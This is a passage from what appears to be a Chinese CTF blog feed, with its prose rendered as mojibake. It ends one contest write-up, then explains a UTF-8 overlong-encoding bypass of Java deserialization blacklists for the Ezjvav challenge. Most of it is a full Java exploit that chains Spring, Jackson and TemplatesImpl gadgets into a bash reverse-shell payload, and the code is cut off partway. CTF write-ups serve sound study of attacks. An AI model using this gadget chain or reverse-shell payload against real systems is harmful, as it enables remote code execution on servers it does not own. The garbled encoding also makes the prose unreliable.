alt="image-20240827224653523"></p><p>åå¼¹ä¸äº†shellï¼Œå¯èƒ½æ˜¯å‘½ä»¤é—®é¢˜ï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥äº¤äº†ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224724342.png" alt="image-20240827224724342"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224731151.png" alt="image-20240827224731151"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æ¯”èµ›å½“å¤©çœŸçš„ç´¯å¾—è·Ÿä¸ªç‹—ä¼¼çš„ï¼Œä»æ—©ä¸Š9ç‚¹ä¸€ç›´æ‰“åˆ°å‡Œæ™¨2ç‚¹ï¼Œè¿˜ä¸æ•¢ç¡è§‰ï¼Œä¸‰ç‚¹å°±è¢«å·å®¶äº†ã€‚</p><p>æˆ‘çš„è¯„ä»·æ˜¯ä¸ä¼šåŠæ¯”èµ›å°±ä¸è¦åŠã€‚å–œæ¬¢æ24å°æ—¶èµ›åˆ¶ï¼Œè¿˜æ²¡æœ‰pyæ£€æµ‹æœºåˆ¶ï¼Œflagéƒ½æ˜¯é™æ€flagï¼Œå®Œå…¨æˆpyå¤§èµ›äº†ï¼Œè¿™å°±æ˜¯ycbã€‚</p><p>æ—¢æ¥ä¹‹åˆ™å®‰ä¹‹ï¼Œæˆ‘å€’è¦çœ‹çœ‹9æœˆ11å·çº¿ä¸‹éƒ½æ˜¯äº›å•¥å¦–é­”é¬¼æ€ªã€‚</p><p>ä»¥ä¸Šã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UTF-8 Overlong Encoding Bypass</title>
    <link href="/2024/08/22/Overlong-Encoding-utf-8-Bypass/"/>
    <url>/2024/08/22/Overlong-Encoding-utf-8-Bypass/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>UTF-8 Overlong Encoding</code>ä¸€ç§ç»•è¿‡é»‘åå•çš„æ‰‹æ®µï¼Œä¹‹å‰æ‰“é¢˜é‡åˆ°è¿‡ä¸¤æ¬¡ï¼Œè¿™æ¬¡å°å°æ€»ç»“ä¸€ä¸‹ã€‚</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master Â· qi4L&#x2F;JYso (github.com)</a></p><p>ä¸€æ¬¡æ˜¯åœ¨äº¬éº’CTFé‡Œç”¨è¿™ä¸ªæ–¹æ³•æ‰“å‡ºè¿‡ä¸€é“ï¼Œè¿˜æœ‰ä¸€é“æ˜¯æœ€è¿‘çš„å·…å³°æå®¢JDK17+CCé“¾çš„ç»•è¿‡ã€‚</p><p>Pç‰›ä»‹ç»äº†UTF-8ç¼–ç æ–¹å¼ä»¥åŠOverlong Encodingçš„æ”»å‡»ï¼š<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html#0x04-overlong-encodingwaf">UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜ | ç¦»åˆ«æ­Œ (leavesongs.com)</a>ï¼Œåœ¨æ­¤æˆ‘ä¸å†å¤šè¯´ã€‚</p><p>å¯ä»¥é€šè¿‡javassistæ¥å¯¹writeUTFå‡½æ•°è¿›è¡Œä¿®æ”¹ï¼Œæ’æ¡©åœ¨agentå¤„ï¼š<a href="https://xz.aliyun.com/t/14300?time__1311=GqAxuD9QiQDQ0=D/82cqYuOrzG881HDgWoD">javaååºåˆ—åŒ–é€šè¿‡java agentå®ç°utf-8 Overlong Encoding - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œè¿˜æ˜¯ç»“åˆé¢˜ç›®æ¥è®²ï¼Œå› ä¸ºè¿™ç®—ä¸€ä¸ªBypassçš„æŠ€å·§ï¼Œå…‰è®²ç†è®ºè‚¯å®šä¸å¤Ÿã€‚</p><h2 id="äº¬éº’CTF2024-Ezjvav"><a href="#äº¬éº’CTF2024-Ezjvav" class="headerlink" title="äº¬éº’CTF2024-Ezjvav"></a>äº¬éº’CTF2024-Ezjvav</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>admin&#x2F;adminå¼±å¯†ç ç™»å½•ï¼Œ</p><p>æ‰«ç½‘é¡µå‘ç°&#x2F;js&#x2F;manage.jsï¼Œè®¿é—®å¾—åˆ°jsæ··æ·†ä»£ç ï¼Œç›´æ¥gptæ¢­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯è·³è½¬&#x2F;sourceè¯»æºç å‡ºæ¥ã€‚</p><p>ä½†æ˜¯æœ‰ä¸ªjwtéªŒè¯ï¼Œå…¶å®å¯†é’¥å°±æ˜¯jsrcï¼Œç„¶åå¸¦cookieè®¿é—®&#x2F;sourceå¾—åˆ°é™„ä»¶ï¼Œç›´æ¥downä¸‹æ¥åˆ†æã€‚</p><p>blacklistï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.util.HashMap&quot;</span>,<br> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <br> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONArrayLlist&quot;</span>&#125;;<br> <br> ----------------------------------------------------------------------------------------------------<br> <br>        blackList.add(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.syndication.feed.impl.ToStringBean&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br></code></pre></td></tr></table></figure><p>romeé“¾å­çš„ä¸€äº›è¢«banäº†ï¼Œå¯ä»¥çœ‹åˆ°äºŒæ¬¡ååºåˆ—åŒ–ç”¨çš„SignedObjectä¹Ÿè¢«banäº†ã€‚</p><p>ä¾èµ–å¦‚ä¸‹ï¼Œæœ‰fjï¼Œromeï¼Œspringï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822162719499.png" alt="image-20240822162719499"></p><p>ä½†è¿™é“é¢˜åªè¦ä½¿ç”¨<code>UTF-8 Overlong Encoding</code>å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªblacklistã€‚</p><p>sinkç‚¹å¾ˆå¥½æ‰¾ï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163252420.png" alt="image-20240822163252420"></p><p>ä»£ç é€»è¾‘å¯è§ä¸¤å±‚wafï¼Œç¬¬ä¸€ä¸ªæ˜¯ä»–è‡ªå®šä¹‰çš„MyObjectInputStreamï¼Œè¿˜æœ‰ä¸€ä¸ªCompared()å‡½æ•°çš„æ£€æµ‹ã€‚</p><p>MyObjectInputStreamçš„blacklistä¸Šé¢å°±è®²äº†ã€‚</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163401930.png" alt="image-20240822163401930"></p><p>Compared()å‡½æ•°çš„blacklistï¼š</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163418863.png" alt="image-20240822163418863"></p><p>ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæ˜¯æ˜æ–‡æµé‡å±‚é¢çš„æ£€æµ‹ï¼Œä¸€ä¸ªæ˜¯ååºåˆ—åŒ–è¿‡ç¨‹çš„æ£€æµ‹ï¼Œå‰è€…å¯ä»¥è‡ªå®šä¹‰è¾“å‡ºæµæ”¹å†™åºåˆ—åŒ–æ•°æ®ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯UTF8é‚£ç©æ„ã€‚<a href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd">Docs (feishu.cn)</a></p><p>å› ä¸ºä¾èµ–æœ‰springçš„ç¼˜æ•…ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æƒ³åˆ°Jacksonçš„ä¸€ä¸ªåŸç”Ÿååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">EventListenerList.readObject -&gt; <br>POJONode.toString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/14190?time__1311=mqmx9QDQdCqqlpzG77Twk4frxA2DGwD&alichlgref=https://www.google.com/">JacksonåŸç”Ÿååºåˆ—åŒ–</a></p><p><a href="https://xz.aliyun.com/t/12846?time__1311=mqmhq+xfrxCWDsD7GY0=YG=FdrIxAx7IIQx&alichlgref=https://www.google.com/#toc-2">å¤„ç†Jacksoné“¾å­ä¸ç¨³å®šæ€§</a></p><p>åˆå› ä¸ºæœ‰fjä¾èµ–ï¼Œæ‰€ä»¥è¿˜èƒ½æ‰“fastjsonçš„åŸç”Ÿååºåˆ—åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject -&gt;<br>HashMap.putVal -&gt;<br>HotSwappableTargetSource.equals -&gt;<br>XString.equals -&gt;<br>JSONArray.toString -&gt; <br>JSONArray#toJSONString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Bypassçš„æ–¹æ³•å°±æ˜¯ç›´æ¥ç”¨<code>UTF8 Overlong Encoding</code>é‡å†™ä¸€ä¸ª<code>ObjectOutputStream</code>ï¼Œç”¨Jacksoné“¾ç¨å¾®æ”¹æ”¹å°±æœ‰äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jsrc.func.ByteCompare;<br><span class="hljs-keyword">import</span> com.example.jsrc.func.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//æœ€é€šç”¨çš„åŠæ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(templatesImpl, Templates.class);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span>(byteArrayOutputStream);<br>        o.writeObject(exp);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getXstringMap</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, node);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, node);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> makeMap(map1, map2);<br><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br>        <span class="hljs-keyword">public</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Character, <span class="hljs-type">int</span>[]&gt;() &#123;&#123;<br>            put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>            put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>            put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>            put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>            put(<span class="hljs-string">&#x27;]&#x27;</span>, <span 